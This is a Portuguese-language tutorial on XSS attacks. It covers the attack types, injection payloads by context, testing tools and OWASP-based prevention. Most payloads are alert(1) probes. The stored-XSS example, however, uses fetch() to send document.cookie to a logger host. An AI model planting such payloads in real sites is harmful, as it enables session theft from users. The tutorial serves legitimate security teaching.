# Ataques XSS (Cross-Site Scripting)

## 1. O que é XSS?

**Cross-Site Scripting (XSS)** é uma vulnerabilidade que permite a um invasor injetar código JavaScript malicioso em páginas visitadas por outros usuários. Quando o navegador da vítima executa esse código, o atacante pode:
- Roubar cookies ou tokens de sessão  
- Redirecionar para sites de phishing  
- Registrar teclas digitadas (keylogging)  
- Modificar o conteúdo da página em tempo real  

---

## 2. Tipos de XSS

1. **Refletido (Reflected XSS)**  
   - O payload faz parte da URL ou de um parâmetro HTTP (GET/POST) e é “refletido” na resposta sem sanitização.  
   - Exemplo de URL vulnerável:  
     ```
     https://exemplo.com/busca?q=<script>alert(1)</script>
     ```

2. **Armazenado (Stored XSS)**  
   - O script malicioso é salvo no servidor (em banco de dados, fórum, comentários) e servido a todos os visitantes.  
   - Muito perigoso: afeta múltiplos usuários sem interação direta.

3. **DOM-based XSS**  
   - A injeção ocorre inteiramente no navegador, por meio de manipulação insegura do DOM em código JavaScript.  
   - Exemplo:  
     ```js
     // vulnerável

     document.getElementById('msg').innerHTML = location.hash;
     ```
     Se a URL for `https://exemplo.com/#<script>alert(1)</script>`, o payload é executado.

---

## 3. Contextos de Injeção

Dependendo de onde o payload é colocado, varia a sintaxe:

| Contexto             | Exemplo de payload                              |
|----------------------|--------------------------------------------------|
| HTML                 | `<script>alert(1)</script>`                     |
| Atributo HTML        | `"><img src=x onerror=alert(1)>`                |
| JavaScript inline    | `";alert(1);//`                                  |
| URL                  | `javascript:alert(1)`                            |
| CSS                  | `style="background:url(javascript:alert(1))"`   |

---

## 4. Exemplos Práticos

### 4.1 Reflected XSS

1. Identifique um parâmetro refletido:
```

GET /search?q=teste HTTP/1.1
Host: alvo.com

```
2. Injete payload:
```

/search?q=<script>alert('XSS')</script>

```
3. Se o alerta disparar, há vulnerabilidade.

### 4.2 Stored XSS

1. Acesse a área de comentários ou perfil de usuário.  
2. Insira:

```html
<script>fetch('https://meu-logger.com/?cookie='+document.cookie)</script>
```

3. Verifique se o script é salvo e executado ao visitar a página.

### 4.3 DOM-based XSS

1. Localize código JavaScript que usa `innerHTML`, `document.write()`, `eval()`, etc.
2. Abuse de valores controlados pelo usuário (hash, querystring, localStorage).

---

## 5. Testando e Explorando

* **Navegador**: usar console para testar injeções rápidas.
* **Interceptadores** (Burp Suite, OWASP ZAP): modificar parâmetros em tempo real.
* **Ferramentas automáticas**:

  * `XSStrike`
  * `XSSer`
  * `Dalfox`

Exemplo com Burp Intruder:

1. Defina a posição de injeção (`§` antes e depois do parâmetro).
2. Carregue wordlist de payloads (ex.: [OWASP XSS Payloads](https://github.com/payloadbox/xss-payload-list)).
3. Dispare o ataque e analise respostas que contenham tags `<script>`.

---

## 6. Prevenção

1. **Validação de entrada**

   * Filtrar ou rejeitar caracteres perigosos (`<`, `>`, `"`, `'`).

2. **Codificação de saída**

   * Escapar valores antes de inseri-los em HTML, atributos, JS, CSS ou URLs.

3. **CSP (Content Security Policy)**

   * Restrinja fontes de scripts com cabeçalhos como

     ```
     Content-Security-Policy: default-src 'self'; script-src 'self'
     ```

4. **Flags de Cookie**

   * `HttpOnly` impede acesso a cookies via JavaScript.
   * `Secure` garante envio somente em HTTPS.

5. **Frameworks seguros**

   * Utilize funções de template que façam escaping automático (React, Django, Rails, etc.).

---

> **Referências**
>
> * OWASP XSS Prevention Cheat Sheet:
>   [https://cheatsheetseries.owasp.org/cheatsheets/Cross\_Site\_Scripting\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
> * OWASP Testing Guide – XSS:
>   [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/01-Testing\_for\_Reflected\_Cross\_Site\_Scripting](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)

